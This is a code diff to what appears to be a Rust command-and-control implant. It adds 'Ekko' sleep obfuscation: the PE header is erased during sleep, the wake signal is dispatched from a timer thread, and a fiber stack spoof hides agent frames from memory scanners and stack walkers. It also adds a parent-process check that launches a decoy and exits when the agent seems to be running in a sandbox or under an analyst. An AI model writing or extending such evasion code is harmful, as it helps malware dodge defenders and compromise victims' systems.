@@ -64,8 +64,9 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         let ciphertext = match cipher.encrypt(nonce, config_bytes.as_ref()) {
             Ok(ct) => ct,
             Err(_) => {
-                // Encryption failed — plain sleep, return config bytes as-is
-                evasion::sleep_with_spoofed_stack(sleep_ms);
+                // Encryption failed — sleep with Ekko mask (PE header erasure +
+                // timer dispatch + fiber stack spoof) and return config as-is.
+                evasion::ekko_sleep(sleep_ms);
                 return config_bytes;
             }
         };
@@ -93,11 +94,28 @@ async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2C
         // the runtime if a worker holds an internal scheduler lock, and
         // breaks active pivot listeners, proxy tunnels, and HTTP polling.
         //
-        // The config is already AES-256-GCM encrypted above, which protects
-        // the most sensitive data (C2 host, keys, build ID) from memory
-        // scanners during sleep. Full heap encryption is only safe in a
-        // single-threaded synchronous agent — not applicable here.
-        evasion::sleep_with_spoofed_stack(sleep_ms);
+        // ekko_sleep handles the sleep with three additional protections
+        // beyond a plain Sleep():
+        //
+        //   Gap 1 — PE header erasure: The MZ/PE header region is zeroed
+        //     for the duration of the sleep and restored on wakeup.  This
+        //     strips field-value signatures (magic, timestamp, EntryPoint
+        //     RVA) that memory scanners match without touching executed code.
+        //
+        //   Gap 3 — Timer-thread dispatch: The wake signal comes from a
+        //     Windows timer-pool thread via CreateTimerQueueTimer; no agent
+        //     code runs on the timer thread (SetEvent is used directly as
+        //     the callback so the thread's entire stack is ntdll/kernel32).
+        //
+        //   Gap 4 — Fiber stack spoof: The sleeping thread converts to a
+        //     fiber and parks inside a clean fiber blocked on the wake event.
+        //     Stack walkers see only ntdll!NtWaitForSingleObject —
+        //     no unbacked agent frames during sleep.
+        //
+        // The C2Config JSON is already AES-256-GCM encrypted above (Gap 1
+        // for data).  Full .text content encryption is deferred to reflective-
+        // load deployments (see docs/evasion.md).
+        evasion::ekko_sleep(sleep_ms);
         
         // 3. Decrypt config
         let aes_key_decrypt = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
@@ -181,6 +199,14 @@ pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
     if !config.debug {
         // UPDATE PATH HERE: self::evasion or just evasion
         if evasion::is_virtualized() { evasion::run_decoy(); }
+
+        // Parent process validation (T1134.004 awareness).
+        // If valid_parents is non-empty in the build config and the agent's
+        // actual parent is not on the list, we're running in an unexpected
+        // spawn context — likely a sandbox or analyst double-click.
+        // run_decoy() exits after printing a plausible error so the process
+        // tree tells analysts nothing interesting.
+        if evasion::is_bad_parent(&config.valid_parents) { evasion::run_decoy(); }
     }
 
     let hwid = utils::get_persistent_id();
